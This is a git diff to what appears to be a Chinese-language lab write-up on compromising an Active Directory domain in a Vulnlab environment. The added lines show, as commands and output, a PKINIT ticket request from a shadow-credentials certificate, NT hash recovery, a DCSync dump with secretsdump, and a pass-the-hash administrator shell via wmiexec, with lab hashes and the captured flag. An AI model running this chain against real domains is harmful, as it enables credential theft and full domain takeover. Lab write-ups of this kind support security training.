@@ -1532,6 +1532,56 @@ proxychains4 -q python3 pywhisker.py -d "eu.junon.vl" -u "svc_backup" -p 'b4ckup
 https://github.com/dirkjanm/PKINITtools
 
 ```bash
+proxychains4 python3 gettgtpkinit.py -cert-pem key_cert.pem -key-pem key_priv.pem eu.junon.vl/S021M200$ dc.ccache
 
+报错 
+KRB_AP_ERR_SKEW(Clock skew too great) 
+需要和dc进行时间同步
+proxychains4 net time set -S 172.16.21.222
+
+
+https://www.freecodecamp.org/chinese/news/how-to-setup-virtual-environments-in-python/
+https://docs.python.org/zh-cn/3/library/venv.html
+
+proxychains4 pip install --force-reinstall https://github.com/wbond/oscrypto/archive/d5f3437ed24257895ae1edd9e503cfb352e635a8.zip
+```
+
+```bash
+export KRB5CCNAME=/home/kali/Desktop/PKINITtools-master/dc.ccache
+
+root@kali:/home/kali/Desktop/PKINITtools-master# klist
+Ticket cache: FILE:/home/kali/Desktop/PKINITtools-master/dc.ccache
+Default principal: S021M200$@EU.JUNON.VL
+
+Valid starting       Expires              Service principal
+11/07/2023 01:45:31  11/07/2023 11:45:31  krbtgt/EU.JUNON.VL@EU.JUNON.VL
+```
+
+```bash
+b287df3a5773605bf91cdb4d5c8abd17bff1e29cb495fb427449db34b054cb14
+
+root@kali:/home/kali/Desktop/PKINITtools-master# proxychains4 -q python3 getnthash.py -key b287df3a5773605bf91cdb4d5c8abd17bff1e29cb495fb427449db34b054cb14 eu.junon.vl/S021M200$
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+90d557741822d4a602d5efaed4051ffb
+```
+
+```bash
+proxychains4 -q  impacket-secretsdump -just-dc 'S021M200$'@172.16.21.222 -hashes :90d557741822d4a602d5efaed4051ffb -outputfile eu_junon.hashes
+
+proxychains4 -q impacket-wmiexec administrator@172.16.21.222 -hashes :ea2c613e21c9c999e7a1e19e0136427e
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+eu-junon\administrator
+
+C:\Users>type C:\Users\Administrator\Desktop\root.txt
+VL{388912a5b7433a36fe332c3f17cf85c6}
 ```
 
